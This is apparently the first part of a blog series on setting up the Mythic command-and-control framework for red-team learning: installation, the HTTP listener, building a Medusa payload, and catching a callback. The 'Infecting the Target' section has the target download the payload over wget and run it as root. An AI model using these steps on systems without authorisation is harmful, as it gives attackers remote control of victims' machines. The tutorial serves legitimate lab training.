This is Part 1 of a series on Mythic C2.

As an offensive cybersecurity professional, learning about C2 frameworks feels essential. I spent some time researching different options and narrowed it down to two popular open source projects: Mythic and Sliver. Both are widely used in red team and adversary emulation work, but I chose Mythic because of its modular architecture and flexibility. Mythic separates agents and communication profiles into individual components that can be dynamically installed and extended, which felt like a good platform for learning and experimentation. It was not overly simple to set up but also not too difficult, making it a good balance for my research and learning goals.

What you’ll learn

In this post, you will:

  • Install Mythic from scratch
  • Configure your first C2 profile
  • Generate a payload
  • Receive your first callback

What is Mythic

Mythic is a multiplayer, command and control platform for red teaming operations. It is designed to facilitate a plug-n-play architecture where new agents, communication channels, and modifications can happen on the fly. Some of the Mythic project’s main goals are to provide quality of life improvements to operators, improve maintainability of agents, enable customizations, and provide more robust data analytic capabilities to operations.

Fundamentally, Mythic uses a web-based front end (React) and Docker containers for the back-end. A GoLang server handles the bulk of the web requests via GraphQL APIs and WebSockets. This server then handles connections to the PostgreSQL database and communicates to the other Docker containers via RabbitMQ. This enables the individual components to be on separate physical computers or in different virtual machines if desired.

source : https://docs.mythic-c2.net/home#what-is-mythic

This post basically covers the first steps of the Mythic setup, I’ll showcase the installation process and test things out with a simple callback.

Mythic is designed to be modular, so it uses docker containers a web‑based UI, and a controller backend, which allows operators to dynamically install and configure agents and communication channels for different environments and protocols.

Unlike some other C2 tools, Mythic does not ship with built‑in agents or listeners. Instead it lets users install and combine payload types (agents) and C2 profiles (communication methods) based on their needs, making it highly customizable and extensible.

Installation

Prerequisites

Mythic is designed to run on linux (It can be ran on macOS but it won’t be covered by this series), it also use Docker and Docker Compose, it’s also recommended to test things out on a VM.

For this demonstration, I’ll be using a Debian 13 terminal, Docker version 29.3.1, build c2be9cc.

Installation & Configuration

Mythic Installation

First, we need to pull the GitHub repository:

git clone https://github.com/its-a-feature/Mythic --depth 1 --single-branch

Next, we need to compile the mythic-cli binary. Most of the configuration and interaction with Mythic is done through this tool. Thankfully, the process is pretty straightforward.

to help with GitHub sizes, the mythic-cli binary is no longer distributed with the main Mythic repository.

cd Mythic/
sudo make

And that’s it. Mythic is now installed on the machine. Next, we’ll move on to the initial configuration.

Mythic Configuration

Most of the Mythic configuration is handled through the .env file. This file is automatically created the first time you start the server.

sudo ./mythic-cli start

Once the server is up and running, you can modify the master password inside the .env file by changing the MYTHIC_ADMIN_PASSWORD variable.

Installing Payloads and Listeners

As mentioned earlier, a fresh Mythic installation does not include any C2 profiles (listeners) or agents (payloads), so we need to install them manually. For this demonstration I’ll be using the Medusa agent linked with the HTTP C2 Profile.

sudo -E ./mythic-cli install github https://github.com/MythicAgents/Medusa.git

sudo -E ./mythic-cli install github https://github.com/MythicC2Profiles/http

After installing both, restart Mythic:

sudo -E ./mythic-cli restart

Configuring the Listener

For this part, Now head over to the web interface: https://127.0.0.1:7443/ and supply the username and password that we configured on the .env file.

We’ll also change the default port for the HTTP listener to avoid conflicts.

  • Click on the headphone icon
  • Go to the C2 tab
  • Select the HTTP profile
  • Click View/Edit Config
  • Change the port from 80 to 9001

Crafting Our First Payload

Click on the + icon to create a new payload.

For this example:

  • Target platform: Linux
  • Payload type: Medusa

Select the commands you want to include. For now, we’ll include all of them.

Next:

  • Disable encryption for simplicity (not recommended in real engagements)
  • Set the callback IP address
  • Set the callback port (must match the listener, e.g., 9001)

Finally, give your payload a name and download it.

Infecting the Target

For this demonstration, we’ll transfer the payload using a simple Python HTTP server.

python3 -m http.server

On the target machine :

wget http://192.168.122.1:8000/test.py

Then execute the payload (as root):

python3 test.py

If everything is configured correctly, you should see a callback appear in the Mythic UI and be able to start issuing commands.

Common issues

One issue I ran into was seeing traffic on the callback port but no callbacks in the UI.

This usually means:

  • The C2 profile is not running properly
  • The payload was misconfigured
  • The callback port does not match the listener

Firing up wireshark helped identify the issue.

Conclusion

At this point, we have a fully working Mythic setup with a functioning C2 profile and a live callback. While the setup process might feel a bit involved at first, it highlights what makes Mythic powerful: its modularity and flexibility.

In the next part, I’ll dive deeper into how agents actually work, how communication happens between the payload and the server, and how to start modifying or building your own components.
